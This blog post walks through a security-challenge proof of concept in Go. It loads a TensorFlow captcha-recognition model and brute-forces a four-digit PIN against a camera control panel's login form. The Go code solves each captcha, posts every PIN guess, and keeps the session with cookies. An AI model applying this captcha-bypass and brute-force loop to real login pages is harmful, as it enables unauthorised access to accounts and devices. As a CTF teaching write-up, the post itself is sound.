+++
author = ["Natalie Pistunovich"]
title = "TensorFlow and Go"
linktitle = "TensorFlow and Go"
date = 2017-12-28T20:00:00Z
series = ["Advent 2017"]
+++

This year I helped organize several online security challenges, one of which is [Blacklight](https://blacklight.ai). Among the things I was asked to do, was creating a POC for a specific challenge, to prove that it's possible to solve in a reasonable time. That challenge was one I face occasionally in my everyday life, not always with success: break a captcha.

The task that requires breaking the captcha is disabling a security camera, to break into a room, without the security camera capturing your face. Here is how it looked before:

![A frame from the camera's capture](/postimages/advent-2017/camera-capture.jpg)

The provided information was the [saved model](https://www.tensorflow.org/programmers_guide/saved_model#apis_to_build_and_load_a_savedmodel) used for captcha recognition in the binary [ProtoBuf](https://developers.google.com/protocol-buffers/docs/gotutorial) format, and a link to the camera control panel.

An input of a TensorFlow model requires doing some TensorFlow!


## A Few words about TensorFlow

TensorFlow is an open-source software for Machine Intelligence, used mainly for machine learning applications such as neural networks.

TensorFlow runs computations involving tensors, and there are many sources to understand what a Tensor is. This article is definitely not a sufficient one, and it only holds the bare minimum to make sense of what the code does. Tensors are awesome and complex mathematical objects, and I encourage you to take the time to learn more about them.

For our purposes, here is the explanation from the [TensorFlow website](https://www.tensorflow.org/programmers_guide/tensors): 
```
A tensor is a generalization of vectors and matrices to potentially higher dimensions. Internally, TensorFlow represents tensors as n-dimensional arrays of base datatypes.
```
A tensor is defined by the data type of the value(s) it holds, and its shape, which is the number of dimensions, and number of values per dimension.

The `flow` part in TensorFlow comes to describe that essentially the graph (model) is a set of nodes (operations), and the data (tensors) "flow" through those nodes, undergoing mathematical manipulation. You can look at, and evaluate, any node of the graph. 


### A Few words about TensorFlow+Go

On the official TensorFlow website, you can find [a page dedicated to Go](https://www.tensorflow.org/install/install_go), where it says "TensorFlow provides APIs that are particularly well-suited to loading models created in Python and executing them within a Go application." It also warns that the TensorFlow Go API is not covered by the [TensorFlow API stability guarantees](https://www.tensorflow.org/programmers_guide/version_compat). To the date of this post, it is still working as expected.

When going to the [package page](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/go/), there are 2 warnings:
1) The API defined in this package is not stable and can change without notice. 
2) The package path is awkward: `github.com/tensorflow/tensorflow/tensorflow/go`.


In theory, the Go APIs for TensorFlow are powerful enough to do anything you can do from the Python APIs, including training. [Here](https://github.com/asimshankar/go-tensorflow/tree/master/train) is an example of training a model in Go using a graph written in Python. In practice, some of tasks, particularly those for model construction are very low level and certainly not as convenient as doing them in Python. For now, it generally makes sense to define the model in TensorFlow for Python, export it, and then use the Go APIs for inference or training that model.[1] So while Go might not be your first choice for working with TensorFlow, they do play nice together when using existing models.



## Let's break into this page

The parts of the page I was facing seemed pretty familiar to your regular captcha-protected form:

* `PIN Code` - brute-force  
* `Captcha` - use the model

So my TO DOs were:

* 1. Build a captcha reader
* 2. While not logged in:
  *	2.1 Generate the next PIN code
  *	2.2 Get captcha text for current captcha image
  *	2.3 Try to log in



### SavedModel CLI

From the [website](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/README.md): `SavedModel is the universal serialization format for TensorFlow models.`

So our first step would be figuring out the input and output nodes of the prediction workflow. [SavedModel CLI](https://www.tensorflow.org/versions/r1.2/programmers_guide/saved_model_cli) is an inspector for doing this. Here's the command and its output:

```
$ saved_model_cli show --dir <PATH> --all


MetaGraphDef with tag-set: 'serve' contains the following SignatureDefs:

signature_def['serving_default']:
The given SavedModel SignatureDef contains the following input(s):
inputs['input'] tensor_info:
    dtype: DT_STRING
    shape: unknown_rank
    name: CAPTCHA/input_image_as_bytes:0
The given SavedModel SignatureDef contains the following output(s):
outputs['output'] tensor_info:
    dtype: DT_STRING
    shape: unknown_rank
    name: CAPTCHA/prediction:0
Method name is: tensorflow/serving/predict
```

What we learn from this are the node names.

Input node: `CAPTCHA/input_image_as_bytes`,

Output node: `CAPTCHA/prediction`.



### Captcha

Now let's load the model, using [`func LoadSavedModel(exportDir string, tags []string, options *SessionOptions) (*SavedModel, error)`](https://godoc.org/github.com/tensorflow/tensorflow/tensorflow/go#LoadSavedModel). The function takes 3 arguments: path, tags and seesion options. Explaining tags and options can easily take the entire post and will shift the focus, so for our purpose I used the convention `{"serve"}`, and provided no session options.

```go
	savedModel, err := tf.LoadSavedModel("./tensorflow_savedmodel_captcha", []string{"serve"}, nil)
	if err != nil {
		log.Println("failed to load model", err)
		return
	}
```

Then get the captcha from the web page, and run it through the model.
First, define the output of an operation in the graph (model+node) and its index.

```go
	feedsOutput := tf.Output{
		Op:    savedModel.Graph.Operation("CAPTCHA/input_image_as_bytes"),
		Index: 0,
	}
```

Create a new tensor. The input can be a scalar, slices, or array.
As we want to predict a captcha, we'll need 1 dimension with 1 element, of type string.

```go
	feedsTensor, err := tf.NewTensor(string(buf.String()))
	if err != nil {
		log.Fatal(err)
	}
```

Set a map from the operation we will apply to the input it will be applied on.

```go
	feeds := map[tf.Output]*tf.Tensor{feedsOutput: feedsTensor}
```

Get the output from the prediction operation into this output struct.

```go
	fetches := []tf.Output{
		{
			Op:    savedModel.Graph.Operation("CAPTCHA/prediction"),
			Index: 0,
		},
	}
```

Run the data through the graph and receive the output - the captcha prediction.

```go
	captchaText, err := savedModel.Session.Run(feeds, fetches, nil)
	if err != nil {
		log.Fatal(err)
	}
	captchaString := captchaText[0].Value().(string)

```

Here is how this looks like:

![The captcha screenshot](/postimages/advent-2017/screenshot.png)



### Generate a PIN code 

The PIN code is made of 4 digits, so we'll go over all the combinations. Additionally, in each iteration the saved model is required for the prediction operation, and of course some logs.

```go
for x := 0; x < 10000; x++ {
		logIntoSite(fmt.Sprintf("%0.4d", x), savedModel, *printLogs)
	}
```

### Try to log in

Once all values are there - the current value of the PIN code in the loop and the captcha prediction - let's POST that request to the login page.

```go
	params := url.Values{}
	params.Set("pin", pinAttempt)
	params.Set("captcha", captchaString)

	res, err := client.PostForm(string(siteUrl+"/disable"), params)
	if err != nil {
		log.Fatal(err)
	}

	defer res.Body.Close()
	buf = new(bytes.Buffer)
	buf.ReadFrom(res.Body)
	response := buf.String()
```

If the captcha prediction failed, run the prediction again, and retry with the same PIN code.

```go
	if parseResponse(response, pinAttempt, captchaString, printLogs) == badCaptcha {
		logIntoSite(savedModel, printLogs)
	}
```

The `parseResponse` function checks and reports whether the website response is a success or one of the failure messages, which I found by manually trying combinations of guessing a PIN code and correct and wrong captcha translations.

```go
func parseResponse(response, pinAttempt, captchaString string, printLogs bool) string {
	message := "something happened"
	if strings.Contains(response, badPIN) {
		message = badPIN
	} else if strings.Contains(response, badCaptcha) {
		message = badCaptcha
	}

	logResponse(printLogs, message, pinAttempt, captchaString, response)
	return message
}
```

### The rest of the code

To complete this code, let's add everyones favorites: cookies and logging.
Generating the captcha starts a new session, and in order to use the predicted captcha in the same session, we will open a cookie jar. Even though it's the first time I am writing about cookies publicly, I will spare cookie jokes, as part of the Christmas spirit.

```go
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatal(err)
	}
	client := &http.Client{
		Jar: jar,
	}
```

And [here](https://github.com/Pisush/break-captcha-tensorflow) is how it looks when it's all composed together.



## To wrap this up

TensorFlow has many great models which can be used with Go. [Here](https://github.com/tensorflow/models) is a great list of those.

Online challenges can be an awesome way to learn, whether it's coding, security or sports. The combination of putting in practice your knowledge and having a mission creates a fun environment where you can work on improving your skills. Consider joining such a challenge as your new year's resolution.

Thanks a lot to [Ed](https://github.com/emedvedev) for reviewing this PR. Also thanks to [Asim Ahankar](https://github.com/asimshankar) from the TensorFlow team for pointing out it is possible to train models with Go, as updated in [1]. We will collaborate further to make the documentation around this more accessible.

If you want to chat more about this, [tweet me](https://twitter.com/nataliepis), or meet me at [Gophercon Iceland](https://gophercon.is)!
